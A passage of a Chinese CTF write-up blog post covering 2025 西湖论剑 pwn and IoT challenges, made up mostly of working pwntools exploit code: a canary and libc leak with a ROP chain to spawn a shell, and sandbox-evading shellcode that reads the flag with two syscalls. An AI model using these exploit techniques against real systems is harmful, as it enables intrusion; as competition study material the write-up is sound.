class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> 	:p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file)</span></span><br><span class="line">p = remote(<span class="string">&quot;gz.imxbt.cn&quot;</span>,....)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span> :</span><br><span class="line">        n += <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Enter your choice: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,value</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the index to edit (0-based): &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Enter the new value: &quot;</span>,<span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">value</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the value to push: &quot;</span>,<span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">push(<span class="number">2</span>)</span><br><span class="line">push(<span class="number">3</span>)</span><br><span class="line">push(<span class="number">4</span>)</span><br><span class="line">push(<span class="number">5</span>)</span><br><span class="line">push(<span class="number">6</span>)</span><br><span class="line">push(<span class="number">20</span>) <span class="comment"># 造成溢出</span></span><br><span class="line"></span><br><span class="line">show() </span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏canary</span></span><br><span class="line">ru(<span class="string">&#x27;20 0 0 0 &#x27;</span>)</span><br><span class="line">canary_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">canary_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">canary_low = check(canary_low) <span class="comment"># 处理出现负数即无符号溢出的情况</span></span><br><span class="line">canary_high = check(canary_high)</span><br><span class="line"></span><br><span class="line">canary = (canary_high &lt;&lt; <span class="number">32</span>) | canary_low</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;canary_high: &quot;</span>,canary_high)</span><br><span class="line">lg(<span class="string">&quot;canary_low: &quot;</span>,canary_low)</span><br><span class="line">lg(<span class="string">&quot;canary: &quot;</span>,canary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏libc</span></span><br><span class="line">ru(<span class="string">&#x27;0 0 0 0 2 0 &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_low = check(libc_low)</span><br><span class="line">libc_high = check(libc_high)</span><br><span class="line"></span><br><span class="line">libc_base = (libc_high &lt;&lt; <span class="number">32</span>) | libc_low</span><br><span class="line">libc.address = libc_base - <span class="number">0x29d90</span></span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc.address + <span class="number">0x0000000000029139</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只需修改ret_addr即可，将“stack&quot;退到ret_addr</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    pop()</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造rop链,get shell</span></span><br><span class="line">push(pop_rdi_ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((pop_rdi_ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(bin_sh &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((bin_sh &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(system &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="Heaven’s-door"><a href="#Heaven’s-door" class="headerlink" title="Heaven’s door"></a>Heaven’s door</h1><p>只允许两次syscal且开启sendbox的shellcode题目。</p>
+<ul>
+<li>先查看一下主函数</li>
+</ul>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  __int64 v7; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">__pid_t</span> v8; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v8 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;puchid: %d\n&quot;</span>, v8);</span><br><span class="line">    mmap((<span class="type">void</span> *)<span class="number">0x10000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0x10000</span>, <span class="number">0xC3</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)count_syscall_instructions(<span class="number">0x10000</span>LL, <span class="number">4096LL</span>) &gt; <span class="number">2</span> ) <span class="comment">// 核心</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    sandbox(<span class="number">0x10000</span>LL, <span class="number">4096LL</span>, v4, v5, v6, v7);</span><br><span class="line">    MEMORY[<span class="number">0x10000</span>]();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    made_in_heaven(); <span class="comment">// 输出一些人名以及作者，用处不大</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The time is Accelerating&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;MADE IN HEAVEN !!!!!!!!!!!!!!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>查看一下核心的函数 <code>count_syscall_instructions</code></li>
+</ul>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">count_syscall_instructions</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; a2 - <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 + i) == <span class="number">15</span> &amp;&amp; *(_BYTE *)(i + <span class="number">1</span> + a1) == <span class="number">5</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里就是检查 <code>\x0f\x05</code>字节码的个数，这刚好是 syscall的字节码，因此我们的shellcode仅能包含两次syscall。</p>
+<p>拿上之前在2024BaseCTF里面的脚本直接梭即可，鸣谢 <code>gets</code>师傅。</p>
+<p>（可参考：<a href="https://downbeat.top/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/%EF%BC%89">https://downbeat.top/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/）</a></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> 	:p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line"><span class="comment">#p = remote(&quot;gz.imxbt.cn&quot;,20551)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment">#libc = ELF(libc)</span></span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov r10, 7</span></span><br><span class="line"><span class="string">    mov rax, 0x101</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,3   </span></span><br><span class="line"><span class="string">    mov rdx,0</span></span><br><span class="line"><span class="string">    mov r10,0x100</span></span><br><span class="line"><span class="string">    push 40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;MADE IN HEAVEN !!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">sd(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="/../image-20250121002148752.png" alt="image-20250121002148752"></p>
+<h1 id="IOT-blink"><a href="#IOT-blink" class="headerlink" title="IOT-blink"></a>IOT-blink</h1><p>直接查看字符串，有个比较特殊的，很抽象。</p>
+<p><img lazyload src="/images/loading.svg" data-src="/../image-20250121002434862.png" alt="image-20250121002434862"></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rtosandmorseisveryeasyhahhaha</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 2025西湖论剑wp-部分pwn和IOT</li>
+        <li><strong>作者:</strong> D0wnBe@t</li>
+        <li><strong>创建于
+                :</strong> 2025-01-20 22:32:04</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-01-21 00:24:58
+            </li>
+        
+        <li>
+            <strong>链接:</strong> http://downbeat.top/2025/01/20/2025西湖论剑wp-部分pwn和IOT/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/ctf-pwn/">#ctf-pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/12/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">文件上传</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://waline.downbeat.top/',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: true,
+          requiredMeta: ['nick', 'mail'],
+          emoji: ['https://unpkg.com/@waline/emojis@1.2.0/qq','https://unpkg.com/@waline/emojis@1.2.0/weibo'],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">目录</div>
+        <div class="page-title">2025西湖论剑wp-部分pwn和IOT</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Vpwn"><span class="nav-text">Vpwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E8%B0%83%E8%AF%95"><span class="nav-text">漏洞点调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="nav-text">完整EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Heaven%E2%80%99s-door"><span class="nav-text">Heaven’s door</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IOT-blink"><span class="nav-text">IOT-blink</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">D0wnBe@t</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 42 篇文章
+                    </span>
+                    
+                        <span>
+                            共 54.1k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
